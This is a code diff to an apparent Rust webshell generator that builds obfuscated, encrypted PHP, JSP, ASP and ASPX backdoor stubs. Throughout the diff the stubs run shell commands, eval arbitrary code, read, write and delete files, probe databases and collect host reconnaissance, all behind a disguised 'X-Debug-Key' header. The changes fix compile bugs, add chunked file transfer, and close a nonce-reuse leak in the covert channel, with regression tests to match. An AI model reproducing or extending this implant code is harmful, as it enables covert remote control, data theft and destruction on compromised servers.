@@ -1433,7 +1433,7 @@ pub fn session_handler_code() -> &'static str {
     r#"// DswSesInit
 function run($p) {
     $req = @json_decode($p, true);
-    if (!is_array($req)) { return '{"ok":false,"error":"bad params"}'; }
+    if (!is_array($req)) { return $n . base64_encode('{"ok":false,"error":"bad params"}') . $n; }
     $a = isset($req['a']) ? (string)$req['a'] : '';
     $n = isset($req['n']) ? (string)$req['n'] : 'abababab';
     $r = array('ok' => true, 'data' => array());
@@ -1444,6 +1444,7 @@ function run($p) {
             'php_version' => PHP_VERSION,
             'current_dir' => getcwd(),
             'separator' => DIRECTORY_SEPARATOR,
+            'info' => array('ChunkedTransfer' => '1'),
         );
     } elseif ($a === 'exec') {
         $c = isset($req['c']) ? (string)$req['c'] : '';
@@ -1469,7 +1470,7 @@ function run($p) {
     } elseif ($a === 'list') {
         $d = isset($req['p']) ? (string)$req['p'] : '.';
         $items = @scandir($d);
-        if ($items === false) { return '{"ok":false,"error":"read dir failed"}'; }
+        if ($items === false) { return $n . base64_encode('{"ok":false,"error":"read dir failed"}') . $n; }
         $out = array();
         foreach ($items as $f) {
             if ($f === '.' || $f === '..') continue;
@@ -1481,28 +1482,32 @@ function run($p) {
         $r['data'] = array('entries' => $out);
     } elseif ($a === 'read') {
         $f = isset($req['p']) ? (string)$req['p'] : '';
-        $c = @file_get_contents($f);
-        if ($c === false) { return '{"ok":false,"error":"read failed"}'; }
+        $o = isset($req['o']) ? (int)$req['o'] : 0;
+        $l = isset($req['l']) ? (int)$req['l'] : 0;
+        $c = @file_get_contents($f, false, null, $o, $l > 0 ? $l : null);
+        if ($c === false) { return $n . base64_encode('{"ok":false,"error":"read failed"}') . $n; }
         $r['data'] = base64_encode($c);
     } elseif ($a === 'write') {
         $f = isset($req['p']) ? (string)$req['p'] : '';
+        $o = isset($req['o']) ? (int)$req['o'] : 0;
         $d = isset($req['d']) ? @base64_decode((string)$req['d']) : '';
-        if (@file_put_contents($f, $d) === false) { return '{"ok":false,"error":"write failed"}'; }
+        $ok = $o > 0 ? @file_put_contents($f, $d, FILE_APPEND) : @file_put_contents($f, $d);
+        if ($ok === false) { return $n . base64_encode('{"ok":false,"error":"write failed"}') . $n; }
     } elseif ($a === 'delete') {
         $f = isset($req['p']) ? (string)$req['p'] : '';
         if (is_dir($f)) { $ok = @rmdir($f); } else { $ok = @unlink($f); }
-        if (!$ok) { return '{"ok":false,"error":"delete failed"}'; }
+        if (!$ok) { return $n . base64_encode('{"ok":false,"error":"delete failed"}') . $n; }
     } elseif ($a === 'rename') {
         $f = isset($req['f']) ? (string)$req['f'] : '';
         $t = isset($req['t']) ? (string)$req['t'] : '';
-        if (!@rename($f, $t)) { return '{"ok":false,"error":"rename failed"}'; }
+        if (!@rename($f, $t)) { return $n . base64_encode('{"ok":false,"error":"rename failed"}') . $n; }
     } elseif ($a === 'mkdir') {
         $d = isset($req['p']) ? (string)$req['p'] : '';
-        if (!@mkdir($d, 0755, true)) { return '{"ok":false,"error":"mkdir failed"}'; }
+        if (!@mkdir($d, 0755, true)) { return $n . base64_encode('{"ok":false,"error":"mkdir failed"}') . $n; }
     } elseif ($a === 'touch') {
         $d = isset($req['p']) ? (string)$req['p'] : '';
         $t = isset($req['t']) ? (int)$req['t'] : time();
-        if (!@touch($d, $t)) { return '{"ok":false,"error":"touch failed"}'; }
+        if (!@touch($d, $t)) { return $n . base64_encode('{"ok":false,"error":"touch failed"}') . $n; }
     } elseif ($a === 'dbprobe') {
         $c = isset($req['c']) ? (string)$req['c'] : '';
         $out = @call_user_func('session_db_probe', $c);
@@ -1693,13 +1698,13 @@ __ALGO__
 /* 业务处理函数 */
 function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){$o='';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
 function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$isd=@$_g[6]($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>$isd?0:@$_g[7]($full),'mtime'=>@$_g[8]($full),'perms'=>@substr(sprintf('%o',@fileperms($full)),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
-function __FETCH__($p){global $_g;$c=@$_g[3]($p);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
-function __STORE__($p,$d){global $_g;$v=@$_g[4]($p,@$_g[1]($d));if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
+function __FETCH__($p,$o=0,$l=0){global $_g;$c=@$_g[3]($p,false,null,(int)$o,(int)$l>0?(int)$l:null);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
+function __STORE__($p,$d,$o=0){global $_g;$raw=@$_g[1]($d);if($raw===false)return '{"ok":false,"error":"write failed"}';$v=((int)$o>0)?@$_g[4]($p,$raw,FILE_APPEND):@$_g[4]($p,$raw);if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
 function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
 function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
-function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
+function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
 function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
 $p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
@@ -1830,8 +1835,8 @@ if(isset($_POST['formData'])){
         elseif($h==__H_EVAL__){$out=__EVALFN__(isset($req['c'])?(string)$req['c']:'');}
         elseif($h==__H_EXEC__){$out=__CMD__(isset($req['c'])?(string)$req['c']:'',isset($req['w'])?(string)$req['w']:'');}
         elseif($h==__H_LIST__){$out=__SCAN__(isset($req['p'])?(string)$req['p']:'.');}
-        elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'');}
-        elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'');}
+        elseif($h==__H_READ__){$out=__FETCH__(isset($req['p'])?(string)$req['p']:'',isset($req['o'])?(int)$req['o']:0,isset($req['l'])?(int)$req['l']:0);}
+        elseif($h==__H_WRITE__){$out=__STORE__(isset($req['p'])?(string)$req['p']:'',isset($req['d'])?(string)$req['d']:'',isset($req['o'])?(int)$req['o']:0);}
         elseif($h==__H_DELETE__){$out=__DROP__(isset($req['p'])?(string)$req['p']:'');}
         elseif($h==__H_RENAME__){$out=__MOVE__(isset($req['f'])?(string)$req['f']:'',isset($req['t'])?(string)$req['t']:'');}
         elseif($h==__H_MKDIR__){$out=__MKDIR__(isset($req['p'])?(string)$req['p']:'');}
@@ -2065,8 +2070,12 @@ impl PayloadEncoder for NativeEncoder {
                             format!(
                                 "$nonce=substr($in,0,12);$raw={{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,0,substr($in,12));"
                             ),
+                            // 响应必须用**全新随机 nonce**：复用请求 nonce 时，
+                            // 响应从 counter=1 起用同一密钥流，而请求已经用掉了
+                            // 第 1 块之后的部分（载荷 > 64 字节时必然重叠）→
+                            // 两段密文异或即两段明文异或，会泄漏命令/文件内容。
                             format!(
-                                "$nonce=substr($in,0,12);$enc=base64_encode($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
+                                "$nonce=substr(md5(uniqid('',true),true),0,12);$enc=base64_encode($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
                             ),
                             vec![],
                         )
@@ -2081,8 +2090,9 @@ impl PayloadEncoder for NativeEncoder {
                             format!(
                                 "$iv=substr($in,0,8);$raw={{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,0,substr($in,8));"
                             ),
+                            // 同上：Rabbit 跳过 64 字节后与请求（前 ≥64 字节）重叠
                             format!(
-                                "$iv=substr($in,0,8);$enc=base64_encode($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
+                                "$iv=substr(md5(uniqid('',true),true),0,8);$enc=base64_encode($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
                             ),
                             vec![],
                         )
@@ -2146,19 +2156,22 @@ impl PayloadEncoder for NativeEncoder {
                 };
                 Ok(jsp_stub(
                     &xk,
-                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    // JSP 是 servlet API：getHeader 使用**报文头原名**，
+                    // 而非 CGI 变量名（HTTP 前缀 + 下划线形式），否则恒为 null → 404
+                    &xor_hex("X-Debug-Key", &xk),
                     &xor_hex(token, &xk),
                     &xor_hex(&key_hex, &xk),
-                    &h("probe"),
-                    &h("exec"),
-                    &h("list"),
-                    &h("read"),
-                    &h("write"),
-                    &h("delete"),
-                    &h("rename"),
-                    &h("mkdir"),
-                    &h("dbprobe"),
-                    &h("dbquery"),
+                    // Java 的 int 只有 32 位：超过 i32::MAX 的常量必须带 L 后缀
+                    &format!("{}L", h("probe")),
+                    &format!("{}L", h("exec")),
+                    &format!("{}L", h("list")),
+                    &format!("{}L", h("read")),
+                    &format!("{}L", h("write")),
+                    &format!("{}L", h("delete")),
+                    &format!("{}L", h("rename")),
+                    &format!("{}L", h("mkdir")),
+                    &format!("{}L", h("dbprobe")),
+                    &format!("{}L", h("dbquery")),
                 ))
             }
             "aspx" => {
@@ -2175,7 +2188,9 @@ impl PayloadEncoder for NativeEncoder {
                 };
                 Ok(aspx_stub(
                     &xk,
-                    &xor_hex("HTTP_X_DEBUG_KEY", &xk),
+                    // ASP.NET 的 Request.Headers 以**报文头原名**为键（CGI 形式由
+                    // stub 内部兜底查询），与 JSP 同因
+                    &xor_hex("X-Debug-Key", &xk),
                     &xor_hex(token, &xk),
                     &xor_hex(&key_hex, &xk),
                     &h("probe"),
@@ -2631,6 +2646,156 @@ mod tests {
         // 载荷是完整源码的 base64（含 <?php 标签）
         let restored = php_stream_decode(&payload).unwrap();
         assert_eq!(restored, code);
+    }
+
+    // --- 跨语言 stub 结构断言（无需容器/运行时，防回归） ---
+
+    /// 回归：生成的 JSP stub 必须是合法 Java。
+    ///
+    /// 历史缺陷：`DSW_mkdir` 缺少闭合花括号（后续方法被声明进方法体），
+    /// 且 md5 前 8 字节常量（最大 4294967295）直接写成 Java int 字面量，
+    /// > i32::MAX 的 6 个操作全部非法 → Jasper 编译失败，协议完全不可用。
+    #[test]
+    fn jsp_stub_is_valid_java_shape() {
+        let stub = NativeEncoder { crypto: "xor" }
+            .stub("jsp", "secret")
+            .unwrap();
+
+        // 1) 每个 static 方法必须在下一个方法声明前闭合
+        let declarations = [
+            "static String DSW_exec",
+            "static String DSW_list",
+            "static String DSW_read",
+            "static String DSW_write",
+            "static String DSW_del",
+            "static String DSW_ren",
+            "static String DSW_mkdir",
+            "static String DSW_dbprobe",
+            "static String DSW_dbquery",
+            "static String DSW_json_get",
+        ];
+        for (index, declaration) in declarations.iter().enumerate() {
+            let Some(start) = stub.find(declaration) else {
+                panic!("JSP stub 缺少 {declaration}");
+            };
+            let next = declarations
+                .get(index + 1)
+                .and_then(|next_declaration| stub.find(next_declaration))
+                .unwrap_or(stub.len());
+            let body = &stub[start..next];
+            let closes = body.matches('}').count();
+            assert!(
+                closes >= 1,
+                "{declaration} 到下一个方法之间没有闭合花括号（方法体未闭合）"
+            );
+        }
+
+        // 2) 哈希派发常量必须带 Java long 后缀
+        let mut checked = 0;
+        for (index, _) in stub.match_indices("h == ") {
+            let rest = &stub[index + 5..];
+            let digits: String = rest.chars().take_while(char::is_ascii_digit).collect();
+            assert!(!digits.is_empty(), "h == 后应为十进制常量");
+            let suffix = rest.chars().nth(digits.len());
+            assert_eq!(
+                suffix,
+                Some('L'),
+                "JSP 派发常量 {digits} 缺少 L 后缀（超过 i32::MAX 时不是合法 Java 字面量）"
+            );
+            checked += 1;
+        }
+        assert!(checked >= 10, "JSP 应包含全部派发分支，实际 {checked}");
+
+        // 3) 请求头必须用 servlet 报文头原名（CGI 形式 getHeader 恒为 null）
+        assert!(
+            stub.contains("request.getHeader(DSW_dec("),
+            "JSP 应通过解密后的头名读取请求头"
+        );
+        assert!(
+            !stub.contains("HTTP_X_DEBUG_KEY"),
+            "JSP 不应把 CGI 头名当作 servlet 头名"
+        );
+    }
+
+    /// 回归：ASP stub 的两处运行期错误。
+    #[test]
+    fn asp_stub_declares_fso_and_handles_empty_output() {
+        let stub = NativeEncoder { crypto: "xor" }
+            .stub("asp", "secret")
+            .unwrap();
+        assert!(
+            stub.contains("Dim sh, p, outv, bytes, m, t, fso"),
+            "Option Explicit 下 DoExec 必须先声明 fso"
+        );
+        assert!(
+            stub.contains("If Len(s) = 0 Then"),
+            "StrToBytes 必须对空串短路（ReDim arr(-1) 会运行期报错）"
+        );
+        assert!(
+            stub.contains(r#"Left(t, 1) <> "\""#),
+            "相对路径判断必须使用反斜杠字面量"
+        );
+    }
+
+    /// 回归：ASPX 头部鉴权需兼容 CGI 形式（不同宿主暴露的键名不同）。
+    #[test]
+    fn aspx_stub_accepts_wire_and_cgi_header_names() {
+        let stub = NativeEncoder { crypto: "xor" }
+            .stub("aspx", "secret")
+            .unwrap();
+        assert!(
+            stub.contains("Request.Headers[gk]"),
+            "ASPX 应以报文头原名为键"
+        );
+        assert!(
+            stub.contains("ServerVariables"),
+            "ASPX 应保留 CGI 形式的兜底查询"
+        );
+        assert!(!stub.contains("HTTP_X_DEBUG_KEY"), "ASPX 不应写死 CGI 头名");
+    }
+
+    /// 回归：流密码变体的响应必须使用**全新** IV/nonce。
+    ///
+    /// 复用请求 IV 时，响应从 counter=1 / skip=64 起用同一密钥流，而请求已经
+    /// 用掉了那一部分（载荷 > 64 字节时必然重叠）→ 两段密文异或即两段明文异或，
+    /// 可猜的请求明文足以还原命令输出与文件内容。
+    #[test]
+    fn stream_cipher_responses_use_fresh_iv() {
+        for crypto in ["chacha20", "rabbit"] {
+            let stub = NativeEncoder { crypto }.stub("php", "secret").unwrap();
+            assert!(
+                stub.contains("uniqid('',true)"),
+                "{crypto} 响应应使用全新随机 IV/nonce"
+            );
+            assert!(
+                !stub.contains("$nonce=substr($in,0,12);$enc")
+                    && !stub.contains("$iv=substr($in,0,8);$enc"),
+                "{crypto} 响应不得复用请求 IV/nonce"
+            );
+        }
+    }
+
+    /// 回归：分阶段处理器的错误分支也必须用 nonce 帧包裹，
+    /// 否则客户端把 ServerError 误判为「响应中未找到协议帧」。
+    #[test]
+    fn session_handler_errors_are_nonce_framed() {
+        let handler = session_handler_code();
+        for message in ["read failed", "write failed", "mkdir failed"] {
+            assert!(
+                handler.contains(&format!(
+                    "return $n . base64_encode('{{\"ok\":false,\"error\":\"{message}\"}}') . $n;"
+                )),
+                "处理器错误分支应带 nonce 帧：{message}"
+            );
+        }
+        // NATIVE stub 的同类字符串是**载荷**（外层统一加帧），不得被误改
+        let native = NativeEncoder { crypto: "xor" }
+            .stub("php", "secret")
+            .unwrap();
+        assert!(
+            !native.contains("$n . base64_encode"),
+            "NATIVE stub 不应出现帧形式的 $n 拼接"
+        );
     }
 }
 
